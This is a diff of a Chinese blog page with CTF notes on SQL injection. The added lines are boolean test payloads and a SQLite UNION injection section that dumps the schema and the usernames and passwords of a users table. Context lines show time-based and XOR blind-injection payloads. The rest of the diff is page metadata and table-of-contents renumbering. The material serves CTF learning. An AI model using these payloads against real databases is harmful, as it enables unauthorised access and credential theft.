@@ -52,6 +52,49 @@
 
 
 
+  
+  
+  
+  
+  
+  
+
+  
+    
+    
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+  
+    
+    
+      
+      
+      
+      
+        
+        
+      
+      
+    
+    
+    
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=微软雅黑:300,300italic,400,400italic,700,700italic&display=swap&subset=latin,latin-ext">
+  
+
+
+
 
 
 
@@ -99,18 +142,18 @@
   };
 </script>
 
-  <meta name="description" content="前言 本篇文章专门用于记录做反序列化类题目的做题姿势，会不断更新。  判断注入常用的的方式12345678&amp;apos;     //  报错有可能存在注入1  or 1=1 #     // 正常显示 可能存在注入 意味着还需要进一步注入1 and 1=1 #    // 正常显示 可能存在注入1 and 1=2 #    // 不能显示 存在注入1 || or 1=1 #    //1 &amp;amp">
+  <meta name="description" content="前言 本篇文章专门用于记录做SQL注入类题目的做题姿势，会不断更新。  判断注入常用的的方式12345678910&amp;apos;     //  报错有可能存在注入1  or 1=1 #     // 正常显示 可能存在注入 意味着还需要进一步注入1 and 1=1 #    // 正常显示 可能存在注入1 and 1=2 #    // 不能显示 存在注入1 || or 1=1 #    //1">
 <meta name="keywords" content="CTF,总结">
 <meta property="og:type" content="article">
 <meta property="og:title" content="CTF-Web【SQL注入】漏洞做题姿势积累">
 <meta property="og:url" content="https://fanygit.github.io/2021/11/15/CTF-Web【SQL注入】漏洞做题姿势积累/index.html">
 <meta property="og:site_name" content="Fan的小酒馆">
-<meta property="og:description" content="前言 本篇文章专门用于记录做反序列化类题目的做题姿势，会不断更新。  判断注入常用的的方式12345678&amp;apos;     //  报错有可能存在注入1  or 1=1 #     // 正常显示 可能存在注入 意味着还需要进一步注入1 and 1=1 #    // 正常显示 可能存在注入1 and 1=2 #    // 不能显示 存在注入1 || or 1=1 #    //1 &amp;amp">
+<meta property="og:description" content="前言 本篇文章专门用于记录做SQL注入类题目的做题姿势，会不断更新。  判断注入常用的的方式12345678910&amp;apos;     //  报错有可能存在注入1  or 1=1 #     // 正常显示 可能存在注入 意味着还需要进一步注入1 and 1=1 #    // 正常显示 可能存在注入1 and 1=2 #    // 不能显示 存在注入1 || or 1=1 #    //1">
 <meta property="og:locale" content="zh-CN">
-<meta property="og:updated_time" content="2021-12-13T14:37:42.217Z">
+<meta property="og:updated_time" content="2022-08-09T03:47:40.362Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="CTF-Web【SQL注入】漏洞做题姿势积累">
-<meta name="twitter:description" content="前言 本篇文章专门用于记录做反序列化类题目的做题姿势，会不断更新。  判断注入常用的的方式12345678&amp;apos;     //  报错有可能存在注入1  or 1=1 #     // 正常显示 可能存在注入 意味着还需要进一步注入1 and 1=1 #    // 正常显示 可能存在注入1 and 1=2 #    // 不能显示 存在注入1 || or 1=1 #    //1 &amp;amp">
+<meta name="twitter:description" content="前言 本篇文章专门用于记录做SQL注入类题目的做题姿势，会不断更新。  判断注入常用的的方式12345678910&amp;apos;     //  报错有可能存在注入1  or 1=1 #     // 正常显示 可能存在注入 意味着还需要进一步注入1 and 1=1 #    // 正常显示 可能存在注入1 and 1=2 #    // 不能显示 存在注入1 || or 1=1 #    //1">
 
 
 
@@ -436,7 +479,7 @@
                 
                   <span class="post-meta-item-text">更新于</span>
                 
-                <time title="修改时间：2021-12-13 22:37:42" itemprop="dateModified" datetime="2021-12-13T22:37:42+08:00">2021-12-13</time>
+                <time title="修改时间：2022-08-09 11:47:40" itemprop="dateModified" datetime="2022-08-09T11:47:40+08:00">2022-08-09</time>
               </span>
             
           
@@ -519,9 +562,9 @@
 
       
         <h3 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h3><blockquote>
-<p>本篇文章专门用于记录做反序列化类题目的做题姿势，会不断更新。</p>
+<p>本篇文章专门用于记录做SQL注入类题目的做题姿势，会不断更新。</p>
 </blockquote>
-<h3 id="判断注入常用的的方式"><a href="#判断注入常用的的方式" class="headerlink" title="判断注入常用的的方式"></a>判断注入常用的的方式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&apos;     //  报错有可能存在注入</span><br><span class="line">1  or 1=1 #     // 正常显示 可能存在注入 意味着还需要进一步注入</span><br><span class="line">1 and 1=1 #    // 正常显示 可能存在注入</span><br><span class="line">1 and 1=2 #    // 不能显示 存在注入</span><br><span class="line">1 || or 1=1 #    //</span><br><span class="line">1 &amp;&amp; 1=1 #</span><br><span class="line">1^0 #    // 显示异常 则存在注入</span><br><span class="line">1^1 #     // 显示正常，可能存在注入</span><br></pre></td></tr></table></figure>
+<h3 id="判断注入常用的的方式"><a href="#判断注入常用的的方式" class="headerlink" title="判断注入常用的的方式"></a>判断注入常用的的方式</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">&apos;     //  报错有可能存在注入</span><br><span class="line">1  or 1=1 #     // 正常显示 可能存在注入 意味着还需要进一步注入</span><br><span class="line">1 and 1=1 #    // 正常显示 可能存在注入</span><br><span class="line">1 and 1=2 #    // 不能显示 存在注入</span><br><span class="line">1 || or 1=1 #    //</span><br><span class="line">1 &amp;&amp; 1=1 #</span><br><span class="line">1^0 #    // 显示异常 则存在注入</span><br><span class="line">1^1 #     // 显示正常，可能存在注入</span><br><span class="line">1&apos; or 3&gt;2 --</span><br><span class="line">1&apos; or 3&lt;2 --</span><br></pre></td></tr></table></figure>
 
 <h4 id="延时注入检测payload"><a href="#延时注入检测payload" class="headerlink" title="延时注入检测payload"></a>延时注入检测payload</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">admin&apos; AND (SELECT 4792 FROM (SELECT(SLEEP(5)))Nttm) AND &apos;fJzs&apos;=&apos;fJzs</span><br></pre></td></tr></table></figure>
 
@@ -534,6 +577,8 @@
 <h5 id="猜测列名"><a href="#猜测列名" class="headerlink" title="猜测列名"></a>猜测列名</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1^(ord(substr((select(group_concat(column_name))from(information_schema.columns)where(table_name=&apos;表名&apos;)),1,1))&gt;0)^1</span><br></pre></td></tr></table></figure>
 
 <h5 id="猜测值"><a href="#猜测值" class="headerlink" title="猜测值"></a>猜测值</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1^(ord(substr((select(group_concat(列名))from(表名)),1,1))&gt;0)^1</span><br></pre></td></tr></table></figure>
+
+<h4 id="sqllit注入"><a href="#sqllit注入" class="headerlink" title="sqllit注入"></a>sqllit注入</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">查找表名和列名</span><br><span class="line">-1&apos; union select 1,2,(select sql from sqlite_master limit 0,1),4;</span><br><span class="line">-1&apos; union select 1,2,(select sql from sqlite_master limit 0,1),4 -- </span><br><span class="line">-1&apos; union select 1,2,(select sql from sqlite_master limit 0,1),4/*</span><br><span class="line"></span><br><span class="line">聚合的方式</span><br><span class="line">-1&apos; union select 1,2,(select group_concat(sql) from sqlite_master),4;</span><br><span class="line">-1&apos; union select 1,2,(select group_concat(sql) from sqlite_master),4 -- </span><br><span class="line">-1&apos; union select 1,2,(select group_concat(sql) from sqlite_master),4/*</span><br><span class="line"></span><br><span class="line">查数据</span><br><span class="line">-1&apos; union select 1,2,(select group_concat(username,password) from users),4;</span><br><span class="line">-1&apos; union select 1,2,(select group_concat(username,password) from users),4 -- </span><br><span class="line">-1&apos; union select 1,2,(select group_concat(username,password) from users),4/*</span><br></pre></td></tr></table></figure>
 
 <h4 id="报错注入语法"><a href="#报错注入语法" class="headerlink" title="报错注入语法"></a>报错注入语法</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and extractvalue(1, concat(0x7e, (语句)))</span><br></pre></td></tr></table></figure>
 
@@ -740,8 +785,8 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2021/12/31/Python库学习/" rel="prev" title="Python库学习">
-                Python库学习 <i class="fa fa-chevron-right"></i>
+              <a href="/2021/12/31/Linux学习笔记/" rel="prev" title="Linux学习笔记">
+                Linux学习笔记 <i class="fa fa-chevron-right"></i>
               </a>
             
           </div>
@@ -815,7 +860,7 @@
         
           <a href="/archives/">
         
-          <span class="site-state-item-count">82</span>
+          <span class="site-state-item-count">84</span>
           <span class="site-state-item-name">日志</span>
         </a>
       </div>
@@ -868,7 +913,9 @@
         
           
         
-        <span class="site-state-item-count">18</span>
+          
+        
+        <span class="site-state-item-count">19</span>
         <span class="site-state-item-name">分类</span>
         </a>
       </div>
@@ -1015,7 +1062,9 @@
         
           
         
-        <span class="site-state-item-count">65</span>
+          
+        
+        <span class="site-state-item-count">66</span>
         <span class="site-state-item-name">标签</span>
         </a>
       </div>
@@ -1108,7 +1157,7 @@
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#判断注入常用的的方式"><span class="nav-number">2.</span> <span class="nav-text">判断注入常用的的方式</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#延时注入检测payload"><span class="nav-number">2.1.</span> <span class="nav-text">延时注入检测payload</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#注入语法"><span class="nav-number">3.</span> <span class="nav-text">注入语法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#异或注入语法"><span class="nav-number">3.1.</span> <span class="nav-text">异或注入语法</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#判断"><span class="nav-number">3.1.1.</span> <span class="nav-text">判断</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#猜测表名"><span class="nav-number">3.1.2.</span> <span class="nav-text">猜测表名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#猜测列名"><span class="nav-number">3.1.3.</span> <span class="nav-text">猜测列名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#猜测值"><span class="nav-number">3.1.4.</span> <span class="nav-text">猜测值</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#报错注入语法"><span class="nav-number">3.2.</span> <span class="nav-text">报错注入语法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#update报错注入"><span class="nav-number">3.3.</span> <span class="nav-text">update报错注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#布尔盲注语法"><span class="nav-number">3.4.</span> <span class="nav-text">布尔盲注语法</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#猜数据库名长度"><span class="nav-number">3.4.1.</span> <span class="nav-text">猜数据库名长度</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#猜数据库名"><span class="nav-number">3.4.2.</span> <span class="nav-text">猜数据库名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#猜数据库中所有表数量"><span class="nav-number">3.4.3.</span> <span class="nav-text">猜数据库中所有表数量</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#猜数据库中单个表长度"><span class="nav-number">3.4.4.</span> <span class="nav-text">猜数据库中单个表长度</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#猜数据库单个表名"><span class="nav-number">3.4.5.</span> <span class="nav-text">猜数据库单个表名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#猜表中字段数量"><span class="nav-number">3.4.6.</span> <span class="nav-text">猜表中字段数量</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#猜表中单个字段长度"><span class="nav-number">3.4.7.</span> <span class="nav-text">猜表中单个字段长度</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#猜表中单个字段名"><span class="nav-number">3.4.8.</span> <span class="nav-text">猜表中单个字段名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#猜表中字段名的字段值数量"><span class="nav-number">3.4.9.</span> <span class="nav-text">猜表中字段名的字段值数量</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#猜表中字段名的字段值长度"><span class="nav-number">3.4.10.</span> <span class="nav-text">猜表中字段名的字段值长度</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#猜表中字段名的字段值"><span class="nav-number">3.4.11.</span> <span class="nav-text">猜表中字段名的字段值</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#时间盲注语法"><span class="nav-number">3.5.</span> <span class="nav-text">时间盲注语法</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#时间盲注函数"><span class="nav-number">3.5.1.</span> <span class="nav-text">时间盲注函数</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#时间盲注-amp-dnslog的利用"><span class="nav-number">3.6.</span> <span class="nav-text">时间盲注&amp;dnslog的利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#无列名注入（只知道表名的情况下查询数据）"><span class="nav-number">3.7.</span> <span class="nav-text">无列名注入（只知道表名的情况下查询数据）</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#子查询绕过"><span class="nav-number">3.7.1.</span> <span class="nav-text">子查询绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#join爆破列名"><span class="nav-number">3.7.2.</span> <span class="nav-text">join爆破列名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#逐字符检索数据"><span class="nav-number">3.7.3.</span> <span class="nav-text">逐字符检索数据</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#regexp注入"><span class="nav-number">3.8.</span> <span class="nav-text">regexp注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#order-by-盲注"><span class="nav-number">3.9.</span> <span class="nav-text">order by 盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#查看表内容未完全显示的方法"><span class="nav-number">3.10.</span> <span class="nav-text">查看表内容未完全显示的方法</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#not-in-排除的方式显示"><span class="nav-number">3.10.1.</span> <span class="nav-text">not in 排除的方式显示</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#left-right-截断的方式显示"><span class="nav-number">3.10.2.</span> <span class="nav-text">left   right 截断的方式显示</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#正则直接匹配"><span class="nav-number">3.10.3.</span> <span class="nav-text">正则直接匹配</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#reserver逆序输出"><span class="nav-number">3.10.4.</span> <span class="nav-text">reserver逆序输出</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#字符串截取函数"><span class="nav-number">3.11.</span> <span class="nav-text">字符串截取函数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sql注入getshell"><span class="nav-number">4.</span> <span class="nav-text">sql注入getshell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#写入一句话"><span class="nav-number">4.1.</span> <span class="nav-text">写入一句话</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#读取文件"><span class="nav-number">4.2.</span> <span class="nav-text">读取文件</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#过滤绕过"><span class="nav-number">5.</span> <span class="nav-text">过滤绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#等于号被过滤"><span class="nav-number">5.1.</span> <span class="nav-text">等于号被过滤</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#括号被过滤"><span class="nav-number">5.2.</span> <span class="nav-text">括号被过滤</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#空格被过滤，替代方法"><span class="nav-number">5.3.</span> <span class="nav-text">空格被过滤，替代方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#可用注释符"><span class="nav-number">5.4.</span> <span class="nav-text">可用注释符</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#关键字被过滤"><span class="nav-number">5.5.</span> <span class="nav-text">关键字被过滤</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ord-被过滤"><span class="nav-number">5.6.</span> <span class="nav-text">ord 被过滤</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#preg-match-绕过"><span class="nav-number">5.7.</span> <span class="nav-text">preg_match 绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#绕过addslashes转义"><span class="nav-number">5.8.</span> <span class="nav-text">绕过addslashes转义</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#逗号被过滤"><span class="nav-number">5.9.</span> <span class="nav-text">逗号被过滤</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#information-schemab-tables-被过滤"><span class="nav-number">5.10.</span> <span class="nav-text">information_schemab.tables   被过滤</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#特殊知识点的解决方法"><span class="nav-number">6.</span> <span class="nav-text">特殊知识点的解决方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#二次注入的payload"><span class="nav-number">7.</span> <span class="nav-text">二次注入的payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#脚本"><span class="nav-number">8.</span> <span class="nav-text">脚本</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#异或盲注脚本"><span class="nav-number">8.1.</span> <span class="nav-text">异或盲注脚本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#网鼎杯2018-Unfinish-拿flag脚本"><span class="nav-number">8.2.</span> <span class="nav-text">[网鼎杯2018]Unfinish 拿flag脚本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#自己写的脚本（用于dvwa和sqllib靶场）"><span class="nav-number">8.3.</span> <span class="nav-text">自己写的脚本（用于dvwa和sqllib靶场）</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#布尔盲注"><span class="nav-number">8.3.1.</span> <span class="nav-text">布尔盲注</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#时间盲注"><span class="nav-number">8.3.2.</span> <span class="nav-text">时间盲注</span></a></li></ol></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-3"><a class="nav-link" href="#前言"><span class="nav-number">1.</span> <span class="nav-text">前言</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#判断注入常用的的方式"><span class="nav-number">2.</span> <span class="nav-text">判断注入常用的的方式</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#延时注入检测payload"><span class="nav-number">2.1.</span> <span class="nav-text">延时注入检测payload</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#注入语法"><span class="nav-number">3.</span> <span class="nav-text">注入语法</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#异或注入语法"><span class="nav-number">3.1.</span> <span class="nav-text">异或注入语法</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#判断"><span class="nav-number">3.1.1.</span> <span class="nav-text">判断</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#猜测表名"><span class="nav-number">3.1.2.</span> <span class="nav-text">猜测表名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#猜测列名"><span class="nav-number">3.1.3.</span> <span class="nav-text">猜测列名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#猜测值"><span class="nav-number">3.1.4.</span> <span class="nav-text">猜测值</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#sqllit注入"><span class="nav-number">3.2.</span> <span class="nav-text">sqllit注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#报错注入语法"><span class="nav-number">3.3.</span> <span class="nav-text">报错注入语法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#update报错注入"><span class="nav-number">3.4.</span> <span class="nav-text">update报错注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#布尔盲注语法"><span class="nav-number">3.5.</span> <span class="nav-text">布尔盲注语法</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#猜数据库名长度"><span class="nav-number">3.5.1.</span> <span class="nav-text">猜数据库名长度</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#猜数据库名"><span class="nav-number">3.5.2.</span> <span class="nav-text">猜数据库名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#猜数据库中所有表数量"><span class="nav-number">3.5.3.</span> <span class="nav-text">猜数据库中所有表数量</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#猜数据库中单个表长度"><span class="nav-number">3.5.4.</span> <span class="nav-text">猜数据库中单个表长度</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#猜数据库单个表名"><span class="nav-number">3.5.5.</span> <span class="nav-text">猜数据库单个表名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#猜表中字段数量"><span class="nav-number">3.5.6.</span> <span class="nav-text">猜表中字段数量</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#猜表中单个字段长度"><span class="nav-number">3.5.7.</span> <span class="nav-text">猜表中单个字段长度</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#猜表中单个字段名"><span class="nav-number">3.5.8.</span> <span class="nav-text">猜表中单个字段名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#猜表中字段名的字段值数量"><span class="nav-number">3.5.9.</span> <span class="nav-text">猜表中字段名的字段值数量</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#猜表中字段名的字段值长度"><span class="nav-number">3.5.10.</span> <span class="nav-text">猜表中字段名的字段值长度</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#猜表中字段名的字段值"><span class="nav-number">3.5.11.</span> <span class="nav-text">猜表中字段名的字段值</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#时间盲注语法"><span class="nav-number">3.6.</span> <span class="nav-text">时间盲注语法</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#时间盲注函数"><span class="nav-number">3.6.1.</span> <span class="nav-text">时间盲注函数</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#时间盲注-amp-dnslog的利用"><span class="nav-number">3.7.</span> <span class="nav-text">时间盲注&amp;dnslog的利用</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#无列名注入（只知道表名的情况下查询数据）"><span class="nav-number">3.8.</span> <span class="nav-text">无列名注入（只知道表名的情况下查询数据）</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#子查询绕过"><span class="nav-number">3.8.1.</span> <span class="nav-text">子查询绕过</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#join爆破列名"><span class="nav-number">3.8.2.</span> <span class="nav-text">join爆破列名</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#逐字符检索数据"><span class="nav-number">3.8.3.</span> <span class="nav-text">逐字符检索数据</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#regexp注入"><span class="nav-number">3.9.</span> <span class="nav-text">regexp注入</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#order-by-盲注"><span class="nav-number">3.10.</span> <span class="nav-text">order by 盲注</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#查看表内容未完全显示的方法"><span class="nav-number">3.11.</span> <span class="nav-text">查看表内容未完全显示的方法</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#not-in-排除的方式显示"><span class="nav-number">3.11.1.</span> <span class="nav-text">not in 排除的方式显示</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#left-right-截断的方式显示"><span class="nav-number">3.11.2.</span> <span class="nav-text">left   right 截断的方式显示</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#正则直接匹配"><span class="nav-number">3.11.3.</span> <span class="nav-text">正则直接匹配</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#reserver逆序输出"><span class="nav-number">3.11.4.</span> <span class="nav-text">reserver逆序输出</span></a></li></ol></li><li class="nav-item nav-level-4"><a class="nav-link" href="#字符串截取函数"><span class="nav-number">3.12.</span> <span class="nav-text">字符串截取函数</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#sql注入getshell"><span class="nav-number">4.</span> <span class="nav-text">sql注入getshell</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#写入一句话"><span class="nav-number">4.1.</span> <span class="nav-text">写入一句话</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#读取文件"><span class="nav-number">4.2.</span> <span class="nav-text">读取文件</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#过滤绕过"><span class="nav-number">5.</span> <span class="nav-text">过滤绕过</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#等于号被过滤"><span class="nav-number">5.1.</span> <span class="nav-text">等于号被过滤</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#括号被过滤"><span class="nav-number">5.2.</span> <span class="nav-text">括号被过滤</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#空格被过滤，替代方法"><span class="nav-number">5.3.</span> <span class="nav-text">空格被过滤，替代方法</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#可用注释符"><span class="nav-number">5.4.</span> <span class="nav-text">可用注释符</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#关键字被过滤"><span class="nav-number">5.5.</span> <span class="nav-text">关键字被过滤</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#ord-被过滤"><span class="nav-number">5.6.</span> <span class="nav-text">ord 被过滤</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#preg-match-绕过"><span class="nav-number">5.7.</span> <span class="nav-text">preg_match 绕过</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#绕过addslashes转义"><span class="nav-number">5.8.</span> <span class="nav-text">绕过addslashes转义</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#逗号被过滤"><span class="nav-number">5.9.</span> <span class="nav-text">逗号被过滤</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#information-schemab-tables-被过滤"><span class="nav-number">5.10.</span> <span class="nav-text">information_schemab.tables   被过滤</span></a></li></ol></li><li class="nav-item nav-level-3"><a class="nav-link" href="#特殊知识点的解决方法"><span class="nav-number">6.</span> <span class="nav-text">特殊知识点的解决方法</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#二次注入的payload"><span class="nav-number">7.</span> <span class="nav-text">二次注入的payload</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#脚本"><span class="nav-number">8.</span> <span class="nav-text">脚本</span></a><ol class="nav-child"><li class="nav-item nav-level-4"><a class="nav-link" href="#异或盲注脚本"><span class="nav-number">8.1.</span> <span class="nav-text">异或盲注脚本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#网鼎杯2018-Unfinish-拿flag脚本"><span class="nav-number">8.2.</span> <span class="nav-text">[网鼎杯2018]Unfinish 拿flag脚本</span></a></li><li class="nav-item nav-level-4"><a class="nav-link" href="#自己写的脚本（用于dvwa和sqllib靶场）"><span class="nav-number">8.3.</span> <span class="nav-text">自己写的脚本（用于dvwa和sqllib靶场）</span></a><ol class="nav-child"><li class="nav-item nav-level-5"><a class="nav-link" href="#布尔盲注"><span class="nav-number">8.3.1.</span> <span class="nav-text">布尔盲注</span></a></li><li class="nav-item nav-level-5"><a class="nav-link" href="#时间盲注"><span class="nav-number">8.3.2.</span> <span class="nav-text">时间盲注</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
